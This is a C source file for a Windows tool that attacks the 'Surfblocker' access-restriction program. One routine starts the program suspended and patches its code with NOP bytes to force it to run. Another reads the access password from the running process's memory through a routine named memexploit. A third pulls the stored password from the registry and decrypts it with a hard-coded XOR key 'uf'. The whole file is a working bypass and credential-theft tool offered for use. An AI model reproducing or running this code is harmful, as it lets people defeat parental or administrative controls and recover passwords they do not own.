#include <windows.h>
#include <psapi.h>

#include "poison.h"
#include "pfunc.h"
#include "resource.h"


void forceRun(HWND hwnd){
	
	OPENFILENAME ofn;
	STARTUPINFO startInfo;
	PROCESS_INFORMATION procInfo;
	DWORD oep;
	BOOL rVal;
	BOOL rVal2;
	
	DWORD baseAddr = 0;
	
	IMAGE_DOS_HEADER DosHead;
	IMAGE_NT_HEADERS hPE;
	
	char szFileName[MAX_PATH] = "";
	unsigned char patch_bytes[] = { 0x90 ,0x90 ,0x90 ,0x90 ,0x90 };

	// zero ofn members
	ZeroMemory(&ofn,sizeof(ofn));
	
	
	ofn.lStructSize = sizeof(ofn);
	ofn.hwndOwner = hwnd;
	ofn.lpstrTitle = "Locate Surfblocker executable file :)";
	ofn.lpstrFilter = "Executable Files\0*.exe\0\0";
	ofn.lpstrFile = szFileName;
	ofn.nMaxFile = MAX_PATH;
	ofn.Flags = OFN_EXPLORER | OFN_FILEMUSTEXIST | OFN_HIDEREADONLY;
	
	ofn.lpstrDefExt = "exe";
	
 if(GetOpenFileName(&ofn) != 0){
	
	GetStartupInfo(&startInfo);

	if(!CreateProcess(szFileName,NULL,NULL,NULL,FALSE,CREATE_SUSPENDED,NULL,NULL,&startInfo,&procInfo))
	{
		MessageBox(hwnd,"Cannot create Surfblocker process!","Error",MB_OK | MB_ICONERROR);
		return;
	}
	else
	{
				
			baseAddr = GetBaseAddress(hwnd,procInfo.hProcess,procInfo.hThread);
			
			if(baseAddr == 0)
			{
				MessageBox(hwnd,"Failed to get image base address!","Error",MB_OK | MB_ICONERROR);
				CloseHandle(procInfo.hThread);
				CloseHandle(procInfo.hProcess);
				return;
			}
			
			rVal = ReadProcessMemory(procInfo.hProcess,(char*)baseAddr,&DosHead,sizeof(IMAGE_DOS_HEADER),NULL);
			rVal2 = ReadProcessMemory(procInfo.hProcess,(char*)baseAddr + DosHead.e_lfanew,&hPE,sizeof(IMAGE_NT_HEADERS),NULL);
			
			
			if(rVal == 0 || rVal2 == 0)
			{
				MessageBox(hwnd,"Failed to get OEP address!","Error",MB_OK | MB_ICONERROR);
				CloseHandle(procInfo.hThread);
				CloseHandle(procInfo.hProcess);
				return;
			}
		    
			oep = baseAddr + hPE.OptionalHeader.AddressOfEntryPoint;
			oep = oep + 0x8C;
			
			if(!WriteProcessMemory(procInfo.hProcess,(char*)oep,patch_bytes,5,NULL))
				MessageBox(hwnd,"Failed to patch process memory","Error",MB_OK | MB_ICONERROR);
			else
			{
				FlushInstructionCache(procInfo.hProcess,NULL,0);
				ResumeThread(procInfo.hThread);
			}
		}
          
     }
	 
	 CloseHandle(procInfo.hThread);
  	 CloseHandle(procInfo.hProcess);
}

void runExploit(HWND hDlg){
	
    WCHAR pass[512];
	unsigned int PID;
	unsigned int constant_addr = 0;
	signed char exploit_status;
	
	MODULEINFO modinfo;
	LPVOID oep_address;
	BOOL testTranslated;
	
	// automatically check if the Surfblocker process is running
	
	if(IsDlgButtonChecked(hDlg,IDC_RADIOAUTO) == BST_CHECKED)
		
		PID = GetProcessPID("TNetProtector","Surfblocker");
		
		// manually enter surfblocker PID
		else if(IsDlgButtonChecked(hDlg,IDC_RADIOENTERPID) == BST_CHECKED)
		{
			PID = GetDlgItemInt(hDlg,IDC_TXTPID,&testTranslated,FALSE);
			
			if(!testTranslated)
			{
				MessageBox(hDlg,"Please enter PID!","Error",MB_OK | MB_ICONEXCLAMATION);
				return;
			}
	    }
	
	if(PID == 0)
	{
		MessageBox(hDlg,"Surfblocker process is NOT running!\nPlease run Surfblocker and try again...\n","Error",MB_OK | MB_ICONEXCLAMATION);
		return;
	}
	
	// try to open process 
	
	HANDLE hProc = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION ,FALSE,PID);
	
	if(!hProc)
	{
		MessageBox(hDlg,"Failed to open process","Error", MB_OK | MB_ICONEXCLAMATION);
		return;
	}
	
	oep_address = GetProcessOEP(hProc,modinfo);
	
	if(oep_address == NULL)
	{
			MessageBox(hDlg,"Failed to get process OEP","Error",MB_OK | MB_ICONERROR);
			goto finish;
	}
		
		
	constant_addr = GetConstantAddress(hProc,oep_address);
	
	if(constant_addr == 0)
	{
		MessageBox(hDlg,"Error reading process memory","Error",MB_OK | MB_ICONERROR);
		goto finish;
	}
	
	exploit_status = memexploit(hProc,constant_addr,pass);
	
	switch(exploit_status)
	{
		
		case 0:
		{
			MessageBox(hDlg,"No access password set!","Info",MB_OK | MB_ICONINFORMATION);
			PostMessage(GetDlgItem(hDlg,IDC_EDIT),EM_SETSEL,0,-1);
			PostMessage(GetDlgItem(hDlg,IDC_EDIT),WM_CLEAR,0,0);
		}
		break;
		
		case 1:
			SetDlgItemTextW(hDlg,IDC_EDIT,pass);
		break;
		
		case -1:
			MessageBox(hDlg,"Error reading process memory","Error",MB_OK | MB_ICONERROR);
		break;
		
	}
	
finish:
	CloseHandle(hProc);
}

void decryptPass(HWND hDlg){
	
	WCHAR password[512];
	WCHAR encrypted_blob[512];
	const char xor_key[] = "uf";
	int i = 0 ,j = 0;
	
	HKEY hKey;
	DWORD blob_size = 0;
	
	// Open registry key
	
	if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Karlis Blumentals\\Surfblocker\\1.0",0,KEY_READ,&hKey) != ERROR_SUCCESS)
	{
		if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Wow6432Node\\Karlis Blumentals\\Surfblocker\\1.0",0,KEY_READ,&hKey) != ERROR_SUCCESS)
		{
			MessageBox(hDlg,"Failed to open registry key!","Error",MB_OK | MB_ICONERROR);
			return;
		}
	}
	
	if(RegQueryValueExW(hKey,L"Password",NULL,NULL,NULL,&blob_size) != ERROR_SUCCESS)	// get encrypted blob size
	{
		MessageBox(hDlg,"Error reading registry value!","Error",MB_OK | MB_ICONERROR);
		return;
	}
	
	
	if(RegQueryValueExW(hKey,L"Password",NULL,NULL,(LPBYTE)&encrypted_blob,&blob_size) != ERROR_SUCCESS) // get encrypted blob data
	{
		MessageBox(hDlg,"Error reading registry value!","Error",MB_OK | MB_ICONERROR);
		return;
	}
	
	
	RegCloseKey(hKey);
	
	blob_size = (blob_size / 2) -1;
	
	// XOR decrypt using 'uf' as repeating key
	
	while( i < blob_size)
	{
	
		if(encrypted_blob[i] == xor_key[j])
		{
			password[i] = encrypted_blob[i];
			i++;
			j++;
			continue;
		}
	
		password[i] = encrypted_blob[i] ^ xor_key[j];
		
		if(j == 2)
		{
			j = 0;
			continue;
		}
		
		i++;
		j++;
	}
	
	password[i] = L'\0'; // null-terminate decrypted password
	SetDlgItemTextW(hDlg,IDC_EDIT,password);
	
}
